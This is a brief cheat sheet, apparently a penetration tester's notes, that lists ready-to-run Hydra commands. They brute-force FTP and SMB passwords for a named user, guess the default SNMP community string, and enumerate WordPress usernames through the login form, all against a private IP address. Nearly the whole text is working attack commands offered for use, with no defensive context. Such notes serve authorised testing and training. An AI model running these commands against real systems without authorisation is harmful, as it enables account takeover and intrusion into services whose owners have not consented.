# Hydra

## System Cracking
```shell
# FTP cracking with known username
hydra -V -l Jason -P ./Wordlists/Passwords.txt -t 16 172.17.19.62 ftp

# SMB cracking with known username
hydra -V -l Jason -P ./Wordlists/Passwords.txt -t 1 172.17.19.62 smb

# SNMP cracking using default read-only community string
hydra -V -p public 172.17.19.62 snmp
```

## Web Cracking
```shell
# User enumeration using set password on Wordpress login
hydra -L users.txt -p unknown 172.17.19.62 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -t 64
```